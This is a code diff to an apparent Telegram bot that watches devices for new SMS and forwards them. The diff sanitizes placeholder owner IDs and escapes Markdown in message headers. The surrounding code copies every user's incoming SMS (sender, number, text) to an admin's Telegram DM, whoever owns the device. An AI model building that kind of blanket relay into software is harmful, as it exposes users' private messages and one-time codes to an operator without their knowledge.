@@ -1,4 +1,5 @@
 import { escapeMarkdown } from "../lib/telegramText";
+import { sanitizeOwnerTelegramId } from "../lib/telegramIds";
 import { Telegraf } from "telegraf";
 import { logger } from "../lib/logger";
 import {
@@ -280,8 +281,11 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
         }
 
         const effectiveWatermark = watermarks[deviceId];
-        const ownerTelegramId: string | null =
-          (deviceData as any)?.ownerTelegramId || null;
+        // Template placeholder ids (e.g. OWNER_TELEGRAM_ID_000000000) and any
+        // non-numeric garbage are treated as "unbound" — never DM'd.
+        const ownerTelegramId: string | null = sanitizeOwnerTelegramId(
+          (deviceData as any)?.ownerTelegramId
+        );
 
         const newEntries = smsEntries
           .filter((sms: any) => getSortKey(sms) > effectiveWatermark)
@@ -324,9 +328,15 @@ export function startSmsWatcher(bot: Telegraf, adminId: number): void {
           }
 
           // ── 1b. Always mirror to admin DM (all users / connections) ──
+          // Escape everything in the header: raw owner/device/from strings
+          // have broken Markdown entities here before (unclosed `_`/`*`).
+          const adminScope =
+            ownerTelegramId && ownerTelegramId !== adminId.toString()
+              ? "user " + ownerTelegramId
+              : "device " + deviceId;
           const adminMsg =
-            `📨 *New SMS*  (${ownerTelegramId && ownerTelegramId !== adminId.toString() ? "user " + ownerTelegramId : "device " + deviceId})\n\n` +
-            `📱 \`${phone}\`  ›  *${from}*\n\n` +
+            `📨 *New SMS*  (${escapeMarkdown(adminScope)})\n\n` +
+            `📱 \`${escapeMarkdown(phone)}\`  ›  *${escapeMarkdown(from)}*\n\n` +
             `${escapeMarkdown(body.slice(0, 160))}${body.length > 160 ? "…" : ""}`;
           enqueue(adminId.toString(), adminMsg);
 
